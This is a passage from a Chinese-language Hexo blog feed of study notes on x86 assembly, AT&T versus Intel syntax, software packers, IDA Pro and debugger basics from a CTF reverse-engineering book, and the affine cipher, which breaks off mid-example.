&lt;label          当小于等于的时候跳转</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmp %ebx, %eax        某些指令执行前先对参数进行cmp操作</span><br><span class="line">jle done          如果 EAX 的值小于等于 EBX 的值, 就跳转到 " done " 标签, 否则就继续执行下一条指令</span><br></pre></td></tr></tbody></table></figure><h3 id="cmp-比较指令"><code>cmp</code> 比较指令</h3><p>比较两个参数的值，适当地设置机器状态字中的条件代码。此指令与sub指令类似，但是cmp不用将计算结果保存在操作数中。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmpb $10, (%ebx)</span><br><span class="line">jeq loop             如果 EBX 的值等于整数常量 10, 则跳转到标签 " loop " 的位置.</span><br></pre></td></tr></tbody></table></figure><h3 id="callret-子程序调用与返回"><code>call</code>，<code>ret</code>子程序调用与返回</h3><p>这两个指令实现子程序的调用和返回。</p><p><code>call</code> 指令首先将当前代码位置推到内存中硬件支持的栈内存上( 请看 <code>push</code> 指令)，然后无条件跳转到标签参数指定的代码位置，<code>call</code> 指令结束后,返回到调用之前的地址。</p><p><code>ret</code> 指令实现子程序的返回。该指令首先从栈中取出代码 (类似于 <code>pop</code> 指令 )，然后它无条件跳转到检索到的代码位置。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call &lt;label</span><br><span class="line">ret</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>汇编</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编</tag>
      
      <tag>x86</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AT&amp;T和Intel汇编语法区别</title>
    <link href="/2022/08/16/AT&amp;T%E5%92%8CIntel/"/>
    <url>/2022/08/16/AT&amp;T%E5%92%8CIntel/</url>
    
    <content type="html"><![CDATA[<p>参考： https://zhuanlan.zhihu.com/p/70590839</p><p>​ https://segmentfault.com/a/1190000040633213 （较为详细）</p><p>​https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/1.5.2_assembly.htmlAT&amp;T汇编基础</p><h1 id="att与intel">AT&amp;T与Intel</h1><p>AT&amp;T语法多应用于Unix/Linux平台，Intel语法多应用于Windows系统。</p><p>以下是这两种语法的主要区别：</p><ul><li><p>目标操作数和源操作数的顺序不同。</p><p>Intel：目标操作数在源操作数的左边。</p><p>AT&amp;T：目标操作数在源操作数的右边。</p><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">将2送入寄存器eax</span><br><span class="line">寄存器esp的值减去500(0x1f4)</span><br><span class="line"></span><br><span class="line">Intel:</span><br><span class="line">      mov eax, 2</span><br><span class="line">      sub esp, 0x1f4 </span><br><span class="line"></span><br><span class="line">AT&amp;T:</span><br><span class="line">      mov $2, %eax</span><br><span class="line">      sub $0x1f4, %esp</span><br><span class="line">      </span><br><span class="line">#注：sub指令是将目标操作数的值中减去源操作数的值，并将结果存储在目标操作数中</span><br></pre></td></tr></tbody></table></figure></li><li><p>AT&amp;T的立即数（立即数通常是指在<a href="https://baike.baidu.com/item/立即寻址方式/6686429">立即寻址方式</a>指令中给出的数。）前要加<code>$</code>，寄存器前要加<code>%</code>；Intel则不需要。</p></li><li><p>操作数字长的表示方法不同。在AT&amp;T汇编格式中，操作数的字长由操作符的最后一个字母决定，后缀<code>b</code>、<code>w</code>、<code>l</code>分别表示操作数为字节（byte，8bit）、字（word，16bit）和长字（long，32bit）；而在Intel汇编格式中，操作数的字长是用<code>byte ptr</code>和<code>word ptr</code>等前缀来表示的。</p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movb val,%al    # <span class="meta">AT</span>&amp;T</span><br><span class="line">movl <span class="built_in">al</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> val   # Intel</span><br></pre></td></tr></tbody></table></figure></li></ul><p>总结：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230521161130215.png" alt="image-20230521161130215"><figcaption aria-hidden="true">image-20230521161130215</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>汇编</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AT&amp;T</tag>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>汇编语言（三）</title>
    <link href="/2022/08/10/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2022/08/10/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="汇编语言三内存访问">汇编语言（三）——内存访问</h1><h2 id="内存中字的存储">内存中字的存储</h2><p>16位寄存器用来存储一个<strong>字</strong>，高8位存放高位字节，低8位存放低位字节。如下图所示，用0、1两个内存单位存放数据<code>2000(4E20H)</code>。0号内存单位是低地址单位，1号内存单位是高地址单位，则字型数据<code>4E20H</code>的低位字节存放在0号内存单位中，高位字节存放在1号内存单位中。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220810144840471.png" alt="image-20220810144840471"><figcaption aria-hidden="true">image-20220810144840471</figcaption></figure><p>由此提出字单位的概念：字单位，即存放了一个字型数据（16位）的内存单位，由两个地址连续的内存单位组成。</p><h2 id="ds和address">DS和[address]</h2><p>DS位<strong>数据</strong>段寄存器（注：CS为<strong>代码</strong>段寄存器），<code>[address]</code>表示一个内存单位，“[address]”中的address表示内存单位的偏移地址。</p><p>例子：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov bx, 1000H</span><br><span class="line">mov ds, bx</span><br><span class="line">mov al, [0]</span><br></pre></td></tr></tbody></table></figure><p>上面的三条指令将10000H（1000:0）中的数据读到<code>al</code>中。指令执行时，8086CPU会自动从ds中取出段地址。</p><p><strong>注意</strong>：8086CPU不支持将数据直接送入<strong>段寄存器</strong>的操作。因此将数据送入段寄存器中，需要另一个寄存器进行中转。</p><h2 id="栈">栈</h2><p>栈的操作规则：LIFO（Last In First Out，先进后出）。</p><p>8086CPU的入栈和出栈操作都是以<strong>字</strong>为单位</p><h3 id="入栈push">入栈（PUSH）</h3><p><code>push ax</code>表示将寄存器ax中的数据送入栈中</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220813164111928.png" alt="image-20220813164111928"><figcaption aria-hidden="true">image-20220813164111928</figcaption></figure><h3 id="出栈pop">出栈（POP）</h3><p><code>pop ax</code>表示从栈顶取出数据送入ax中。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220813164450842.png" alt="image-20220813164450842"><figcaption aria-hidden="true">image-20220813164450842</figcaption></figure><h3 id="sssp">SS:SP</h3><p>任意时刻，SS:SP指向栈顶元素。</p><p>执行<code>push ax</code>时，SP=SP-2，SS:SP指向当前栈顶前面的单位，并以当前单位为新的栈顶，然后将ax中的内容送入SS:SP指向的内存单位处。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220813175527754.png" alt="image-20220813175527754"><figcaption aria-hidden="true">image-20220813175527754</figcaption></figure><h3 id="栈顶超界问题">栈顶超界问题</h3><h4 id="执行push后栈顶超出栈空间">执行push后栈顶超出栈空间</h4><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220813180252161.png" alt="image-20220813180252161"><figcaption aria-hidden="true">image-20220813180252161</figcaption></figure><p>此时1000EH和1000FH单元中的内容被覆盖。</p><h4 id="执行pop后栈顶超出栈空间">执行pop后栈顶超出栈空间</h4><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220813180511395.png" alt="image-20220813180511395"><figcaption aria-hidden="true">image-20220813180511395</figcaption></figure><p>如果此时执行push指令，10020H和10021H单位中的内容被覆盖。</p>]]></content>
    
    
    <categories>
      
      <category>汇编</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编</tag>
      
      <tag>内存</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>地址的寻址能力</title>
    <link href="/2022/07/13/%E5%9C%B0%E5%9D%80%E7%9A%84%E5%AF%BB%E5%9D%80%E8%83%BD%E5%8A%9B/"/>
    <url>/2022/07/13/%E5%9C%B0%E5%9D%80%E7%9A%84%E5%AF%BB%E5%9D%80%E8%83%BD%E5%8A%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="位地址的寻址能力为64kb">16位地址的寻址能力为64KB</h1><p>一个内存单位的大小是1个字节（B）。</p><p>16根地址总线可以寻址的范围为2的16次方个内存单位（单位：B）。</p><p>2^16 B = 2^10 * 2^6 B</p><p>2^10 = 1024 B = 1KB</p><p>所以 2^16 B = 1KB * 64 = 64KB</p><p>所以16位CPU的一个段的长度最大为64KB。</p>]]></content>
    
    
    <categories>
      
      <category>汇编</category>
      
    </categories>
    
    
    <tags>
      
      <tag>地址总线</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>汇编语言（二）</title>
    <link href="/2022/04/17/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2022/04/17/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="汇编语言二寄存器">汇编语言（二）——寄存器</h1><h2 id="通用寄存器">通用寄存器</h2><p>8086CPU的所有寄存器都是16位的，可存放两个字节。AX、BX、CX、DX这四个寄存器通常用来存放一般性的数据，被称为通用寄存器。</p><p>上述每个寄存器都可分为两个可独立使用的8位寄存器来用：</p><ul><li>AX可分为AH和AL</li><li>......</li></ul><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220417223837183.png" alt="image-20220417223837183"><figcaption aria-hidden="true">image-20220417223837183</figcaption></figure><h2 id="位结构的cpu">16位结构的CPU</h2><ul><li>运算器一次最多可以处理16位的数据</li><li>寄存器的最大宽度位16位</li><li>寄存器和运算器之间的通路为16位</li></ul><p>16位CPU能一次性处理、传输、暂时存储16位的地址。</p><p>8086CPU采用一种在内部用两个16位地址<strong>合成</strong>的方法来形成一个20位的<strong>物理地址</strong>（内存单位构成存储空间，每个内存单元在该空间都有唯一的地址，这个唯一的地址称为物理地址）。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220417225126237.png" alt="image-20220417225126237"><figcaption aria-hidden="true">image-20220417225126237</figcaption></figure><p>上图中地址加法器采用<strong>物理地址 = 段地址 x 16 +偏移地址</strong>的方法合成物理地址。</p><h2 id="段的概念">段的概念</h2><p>内存并没有分段，段的分类来自于CPU，由于CPU对物理地址的合成，我们可以用分段的方式来管理内存。同时可知一个段的起始地址一定是16的倍数，偏移地址为16位，16位地址的寻址能力为64KB，因此一个段的长度最大为64KB。</p><h2 id="段寄存器">段寄存器</h2><p>段地址在8086CPU的段寄存器中存放。该CPU有4个寄存器：CS、DS、SS、ES。</p><h2 id="cs和ip">CS和IP</h2><p>CS为<strong>代码</strong>段寄存器，IP为指令指针寄存器。</p><p>任意时刻，设CS中的内容为M，IP中的内容为N，则8086CPU将从内存<strong>Mx16+N</strong>单元开始，读取一条指令并执行。即任意时刻，CPU将CS:IP指向的内容当作指令执行。</p><p>一个最简单的可以修改CS、IP的指令：<strong>jmp</strong>指令<br><strong>jmp2AE3:3</strong>，执行后：CS=2AE3H，IP=0003H，CPU将从2AE33H处读取指令。<br><strong>jmpax</strong>相当于<strong>mov IP, ax</strong>。</p>]]></content>
    
    
    <categories>
      
      <category>汇编</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编</tag>
      
      <tag>寄存器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zsh:权限不够</title>
    <link href="/2022/04/10/zsh%E6%9D%83%E9%99%90%E4%B8%8D%E5%A4%9F/"/>
    <url>/2022/04/10/zsh%E6%9D%83%E9%99%90%E4%B8%8D%E5%A4%9F/</url>
    
    <content type="html"><![CDATA[<p>今天在写逆向题目时想要运行一个Linux可执行文件，结果直接提示权限不够</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220410175645399.png" alt="image-20220410175645399"><figcaption aria-hidden="true">image-20220410175645399</figcaption></figure><p>在搜索一番后打算记录一下解决方案</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220410175813130.png" alt="image-20220410175813130"><figcaption aria-hidden="true">image-20220410175813130</figcaption></figure><p>通过执行<code>chmod a+x ./文件名</code>，之后再次执行该文件即可成功</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220410175950181.png" alt="image-20220410175950181"><figcaption aria-hidden="true">image-20220410175950181</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>命令行</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>zsh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>壳</title>
    <link href="/2022/04/05/%E5%A3%B3/"/>
    <url>/2022/04/05/%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="保护壳简介">保护壳简介</h1><p>参考：CTF Wiki(保护壳简介)</p><h2 id="壳是什么">壳是什么</h2><p><strong>壳</strong>是在一些计算机软件里也有一段专门负责保护软件不被非法修改或反编译的程序。</p><p>它们一般都是先于程序运行，拿到控制权，然后完成它们保护软件的任务。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220405135833408.png" alt="image-20220405135833408"><figcaption aria-hidden="true">image-20220405135833408</figcaption></figure><h2 id="壳的分类">壳的分类</h2><p>分为<strong>加密壳</strong>和<strong>压缩壳</strong>。</p><h3 id="压缩壳">压缩壳</h3><p>压缩壳可以帮助缩减 PE 文件的大小，隐藏了 PE文件内部代码和资源，便于网络传输和保存。</p><p>通常压缩壳有两类用途，一种只是单纯用于压缩普通 PE文件的压缩壳，而另一种则会对源文件进行较大变形，严重破坏 PE文件头，经常用于压缩恶意程序。</p><p>常见的压缩壳有：Upx、ASpack、PECompat</p><h3 id="加密壳">加密壳</h3><p>加密壳或称保护壳，应用有多种防止代码逆向分析的技术，它最主要的功能是保护PE 免受代码逆向分析。</p><p>由于加密壳的主要目的不再是压缩文件资源，所以加密壳保护的 PE程序通常比原文件大得多。</p><p>目前加密壳大量用于对安全性要求高，对破解敏感的应用程序，同时也有恶意程序用于避免（降低）杀毒软件的检测查杀。</p><p>常见的加密壳有：ASProtector、Armadillo、EXECryptor、Themida、VMProtect</p>]]></content>
    
    
    <categories>
      
      <category>逆向工程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>壳</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>汇编语言（一）</title>
    <link href="/2022/03/14/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2022/03/14/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>《汇编语言》第三版 王爽</p><h1 id="汇编语言一总线">汇编语言（一）——总线</h1><p>CPU和其他芯片的导线，通常称为总线。总线从物理上来讲，就是一根根导线的集合。根据传送信息的不同，总线从逻辑上又分为三类：地址总线、控制总线和数据总线。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220314193017202.png" alt="image-20220314193017202"><figcaption aria-hidden="true">image-20220314193017202</figcaption></figure><span id="more"></span><h2 id="地址总线">1.地址总线</h2><p>CPU是通过地址总线来指定存储器单元的。因此，地址总线上能传送多少个不同的信息，CPU就可对多少个存储单元进行寻址。</p><p>一个CPU有N根地址线，则可以说这个CPU的地址总线的宽度为N。且该CPU最多可寻找2的N次方个内存单元。</p><h2 id="数据总线">2.数据总线</h2><p>数据总线的宽度决定了CPU和外界的数据传输速度。8根数据总线一次可传送一个8位二进制数据（一个字节）。<br>8088CPU的数据总线宽度为8，8086CPU的数据总线宽度为16。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220314194203085.png" alt="image-20220314194203085"><figcaption aria-hidden="true">image-20220314194203085</figcaption></figure><h2 id="控制总线">3.控制总线</h2><p>CPU对外部器件的控制是通过总线来进行的。控制总线的宽度决定了CPU对外部器件的控制能力。</p>]]></content>
    
    
    <categories>
      
      <category>汇编</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编</tag>
      
      <tag>总线</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/02/22/hello-world/"/>
    <url>/2022/02/22/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your veryfirst post. Check <a href="https://hexo.io/docs/">documentation</a> formore info. If you get any problems when using Hexo, you can find theanswer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> oryou can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><span id="more"></span><h2 id="quick-start">Quick Start</h2><h3 id="create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server">Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>逆向工程-《从0到1:CTFer成长之路》</title>
    <link href="/2022/02/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-%E3%80%8A%E4%BB%8E0%E5%88%B01CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8B/"/>
    <url>/2022/02/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-%E3%80%8A%E4%BB%8E0%E5%88%B01CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="静态分析">静态分析</h1><p>逆向工程最基本的方法就是静态分析，即不运行二进制程序，而是直接分析程序文件中的机器指令等各种信息。目前，静态分析最常用的工具是IDAPro，本节以IDA Pro的使用为基础介绍静态分析的一般方法。</p><h2 id="一-ida使用入门">一、 IDA使用入门</h2><p>本节所需代码文件为1-helloworld。（https://book.nu1l.com/tasks/#/pages/reverse/5.2）</p><h3 id="打开文件">打开文件</h3><p>首先在打开文件前需要选择正确的架构版本（32bit/64bit）。可通过Linux中的file命令来查看：</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220222134203478.png"></p><p>或者将文件任意拖进一个架构，然后在加载时即可知道文件的架构信息：</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220222134247988.png"></p><h3 id="加载文件">加载文件</h3><p>使用默认设置，单击“OK”进入IDA。</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220222134336662.png"></p><p>（1）导航栏 （2）反汇编的主窗口（3）函数窗口：可通过Ctrl+F组合键进行筛选。 （4）输出窗口（5）状态指示器：显示为“AU：idle”即代表IDA已经完成了对程序的自动化分析。在反汇编窗口中使用右键菜单或者快捷键空格可以在控制流图和文本界面反汇编间切换。### 数据类型操作</p><p>用户可根据地址的颜色来分辨某个位置的数据类型。 代码位置：黑色数据位置：灰色 未定义数据类型位置：黄色</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220222134422946.png"></p><p>下面介绍一部分定义数据类型的快捷键。 *U（Undefine）键：取消一个地方已有的数据类型定义，此时会弹出确认的对话框，单击“Yes”按钮即可。*D（Data）键：让某一个位置变成数据。一直按D键，这个位置的数据类型将会以1字节（byte/db）、2字节（word/dw）、4字节（dword/dd）、8字节（qword/dq）进行循环。*C（Code）键：让某个位置变为指令。在定义为指令后，IDA会自动以此为起始位置进行递归下降反汇编。* A（ASCII）键：会以该位置为起点定义一个以“\0”为结尾的字符串类型。 *<em>键：将此处定义为一个数组，此时弹出一个对话框，用来设置数组的属性。</em> O（Offset）键：将此处定义为一个地址偏移。 ### 函数操作</p><p>处理函数的操作：</p><ul><li>删除函数：在函数窗口中选中函数后，按Delete键。</li><li>定义函数：在反汇编窗口中选中对应行后，按P键。</li><li>修改函数参数：在函数窗口中选中并按Ctrl+E组合键，或在反汇编窗口的函数内部按Alt+P组合键。</li></ul><h3 id="导航操作">导航操作</h3><ul><li>后退到上一位置：快捷键Esc。</li><li>前进到下一位置：快捷键Ctrl+Enter。</li><li>跳转到某个特定位置：快捷键G，然后可以输入地址/已定义的名称。</li><li>跳转到某一区域：快捷键Ctrl+S，然后选择区域即可。 ### 类型操作</li></ul><p>选中变量、函数后按Y键，弹出“Please enter the typedeclaration”对话框，从中输入正确的C语言类型，IDA就可以解析并自动应用这个类型。### IDA操作的模式</p><h3 id="idapython">IDAPython</h3><h3 id="da的其他功能">DA的其他功能</h3><ul><li><strong>String窗口</strong>：按Shift+F12组合键即可打开。</li><li><strong>十六进制窗口</strong>：默认打开，可以按F2键对数据库中的数据进行修改，修改后再次按F12键即可应用修改。</li></ul><p>IDA更加详细的使用技巧：https://leeyuxun.github.io/IDA%E5%9F%BA%E7%A1%80%E5%8A%9F%E8%83%BD%E6%80%BB%E7%BB%93.html</p><h2 id="二-hexrays反编译器入门">二、 HexRays反编译器入门</h2><p>HexRays能够充分利用IDA确定的函数局部变量和数据类型，优化后生成类似C语言的伪代码。### 生成伪代码</p><p>在反汇编窗口中定位到目标函数，按F5键即可显示反编译后的伪代码。</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/5f390dd13ff64704a9f08e2500bcda86.png"></p><h3 id="伪代码构成">伪代码构成</h3><p>HexRays生成的伪代码是有一定的结构的，每个函数反汇编后，第一行都为函数的原型，然后是局部变量的声明区域，最后是函数的语句。</p><h3 id="修改标识符">修改标识符</h3><p>HexRays非常强大，可以自动命名很多变量。但是有些变量的名称没有实际意义。因此HexRays提供了更改标识符名称的功能：将光标移动到标识符上，然后按N键，弹出更改名称的对话框，在输入框中输入一个合法的名称，单击“OK”即可。</p><h3 id="切换数据显示格式">切换数据显示格式</h3><ul><li><p>Hexadecimal：十六进制显示，快捷键为H键。</p></li><li><p>Octal：八进制显示。</p></li><li><p>Char：将常量转化为‘A’的格式，快捷键为R键。</p></li><li><p>Enum：将常量转为枚举中的一个值，快捷键为M键。</p></li><li><p>Invert sign：将常量按照补码解析为负数，快捷键为_键。</p></li><li><p>Bitwise negate：将常量按位取反，形如C语言中的~0xF0，快捷键为~键。</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220222134555155.png"></p></li></ul><h3 id="修改变量类型">修改变量类型</h3><p>HexRays充分利用了前面介绍过的IDA的类型分析系统，在要修改类型的标识符上按Y键，即可调出对话框来修改类型。</p><p>注： <strong>byte</strong>——1字节整型，8位，char、__int8;<strong>word</strong>——2字节整型，16字节，short、__int16;<strong>dword</strong>——4字节整型，32字节，int、__int32;<strong>qword</strong>——8字节整型，64字节，__int64、long long。</p><h1 id="动态调试与分析">动态调试与分析</h1><h2 id="一调试的基本原理">一、调试的基本原理</h2><p>与IDE调试器的调试操作大同小异：在感兴趣的地方设置断点，使程序中断；然后一行行跟踪程序的执行，选择进入或略过一个函数；在跟踪的过程中查看程序各变量的值，从而了解程序的内部状态。## 二、OllyDBG和x64DBG调试 （注：OD仅支持32位程序） ### 打开文件</p><p>x64DBG和OD的布局相同，左上区域为反汇编结果，左下区域为浏览程序内存数据的区域，右下区域为栈数据，右上区域为寄存器的显示区域。### 控制程序运行</p><p>按Ctrl+G组合键，可以跳转到目标地址；在反汇编窗口中，按F2键为切换当前地址的断点状态，按F8键为单步步过，按F7键为单步步入，按F4键为运行到光标处位置，按F9键为运行。### 简单的脱壳</p><p>“壳”是一种特殊的程序，对另一个程序进行变换后，利用变换的结果重新生成可执行文件。在运行时，它全部或部分还原储存在可执行文件中的变换结果，然后恢复原程序的的执行。壳分为两种：压缩壳和加密壳。</p><ul><li>压缩壳注重对代码的压缩，从而生成更小的可执行文件。如UPX、ASPack等。</li><li>加密壳注重对代码的保护，以阻碍逆向者进行分析。如VMP、ASProtect等。</li></ul><p><strong>未加壳</strong>：</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220222134626958.png"></p><p><strong>加壳后</strong>：</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220222134653293.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/13c82cdaba7445339895d7b97443f9a1.png"></p><p><strong>静态脱壳</strong>：</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220222134746506.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220222134805516.png"></p><p><strong>动态脱壳</strong>：原理：大多数壳都有一个共同的特点。在壳准备开始解压时都要执行pushad，当壳解压完时都要调用popad。到底pushad和 popad是什么干什么用的呢?其实pushad是用来将所有普通寄存器顺序进栈的指令popad是所有普通寄存器顺序出栈指令。popad的出栈顺序和pushad相反。壳为了保护寄存器，便在解压前将所有寄存器进栈保护起来，当解压完成后又将寄存器出栈，恢复其原貌，并将IP设置为原程序的OEP（OriginalEntryPoint，程序的入口点）。这样我们就可以通过这个特点快速脱掉多种软件的壳。参考：<br>https://wenku.baidu.com/view/82752bf4ba0d4a7302763a98.html</p>]]></content>
    
    
    <categories>
      
      <category>逆向工程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IDA</tag>
      
      <tag>动态调试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>仿射密码</title>
    <link href="/2022/02/21/affine/"/>
    <url>/2022/02/21/affine/</url>
    
    <content type="html"><![CDATA[<h1 id="仿射密码">仿射密码</h1><h2 id="简介">1.简介</h2><p>仿射密码是一种单字母替换密码的特例。</p><p>该密码不如简单替换密码安全，因为它不仅容易受到针对替代密码的所有攻击方法，而且还存在其他缺点。其主要缺点来自以下方面：如果密码分析者可以发现（通过频率分析，暴力破解，猜测或其他方式）两个密文字符对应的明文，则可以通过联立方程组来求解密钥。</p><h2 id="数学描述">2.数学描述</h2><p>仿射密码的<strong>密钥</strong>由2个数字组成，我们将其称为a和b。以下讨论假定使用26个字符的字母（m=26）。a应该选择为相对于m素数（即a应该没有与m相同的公因数&lt;除1以外&gt;）。例如15和26没有公因数(除1以外)，因此15是可以用来加密的值，然而12和26具有相同公因数（例如2），这样12不能被用于加密。加密时，我们首先将所有字母转换为数字（'a'=0，'b'= 1，...，'z'= 25）。</p><p>对于密文c，给定任意的p（p是代表字母的数字），有：</p><p>c = ap + b (mod m) 1&lt;=a&lt;=m, 1&lt;=b&lt;=m;</p><p>解密的公式为：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220221205948026.png" alt="image-20220221205948026"><figcaption aria-hidden="true">image-20220221205948026</figcaption></figure><p>其中a-1是a的乘法逆元，为了找到a的乘法逆元，我们需要假定数字x满足：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220221210010143.png" alt="image-20220221210010143"><figcaption aria-hidden="true">image-20220221210010143</figcaption></figure><p>如果我们发现x使得等式成立，那么X就是a的逆元，我们称之为a-1。</p><p>解决此方程式最简单的方法是遍历1到25个数字，然后看哪个满足该方程式。</p><h2 id="示例">3.示例</h2><blockquote><p>令密钥a=5且b=7，加密defend the east wall of the castle</p></blockquote><p>我们将第一个字母'd'转换为数字3（'a'= 0，'b'= 1，...，'z'=25）并将其代入等式中：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220221210037643.png" alt="image-20220221210037643"><figcaption aria-hidden="true">image-20220221210037643</figcaption></figure><p>显而易见，我们可以依次得到明文： 